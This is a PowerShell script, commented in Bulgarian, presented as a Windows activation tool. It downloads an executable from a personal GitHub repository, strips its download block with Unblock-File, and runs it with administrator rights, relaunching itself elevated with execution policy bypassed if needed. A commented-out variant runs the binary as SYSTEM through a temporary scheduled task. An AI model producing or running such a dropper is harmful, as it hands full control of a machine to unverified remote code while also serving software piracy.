$url = "https://raw.githubusercontent.com/acenljd/Windows-Activator/refs/heads/main/Microsoft%20Activation%20Scripts.exe"
$tempFile = "$env:TEMP\Microsoft Activation Scripts.exe"

# Проверка дали сме администратори
$isAdmin = ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole]::Administrator)

if (-not $isAdmin) {
    Write-Host "Трябват администраторски права!" -ForegroundColor Red
    Write-Host "Стартирай PowerShell като администратор." -ForegroundColor Yellow
    
    # Автоматично рестартиране като администратор
    $script = @"
    `$url = '$url'
    `$tempFile = '$tempFile'
    
    Invoke-WebRequest -Uri `$url -OutFile `$tempFile
    Unblock-File -Path `$tempFile
    Start-Process `$tempFile -WorkingDirectory `$env:TEMP -Wait
"@
    
    $scriptFile = "$env:TEMP\run_mas.ps1"
    Set-Content -Path $scriptFile -Value $script
    
    Start-Process powershell -ArgumentList "-ExecutionPolicy Bypass -File `"$scriptFile`"" -Verb RunAs
    exit
}

# Ако вече сме администратори - продължаваме
Write-Host "Администраторски права: OK" -ForegroundColor Green

# Изтегляне
Invoke-WebRequest -Uri $url -OutFile $tempFile
Unblock-File -Path $tempFile

# Опция 1: Директно стартиране (сега няма да пита за UAC, защото вече сме админ)
Start-Process $tempFile -WorkingDirectory $env:TEMP -Wait

# Опция 2: Ако все още има проблеми - създаваме задача
# $taskName = "RunMAS_$(Get-Random)"
# $action = New-ScheduledTaskAction -Execute $tempFile -WorkingDirectory $env:TEMP
# $trigger = New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2)
# $principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest
# 
# Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force
# Start-ScheduledTask -TaskName $taskName
# Start-Sleep -Seconds 5
# Unregister-ScheduledTask -TaskName $taskName -Confirm:$false
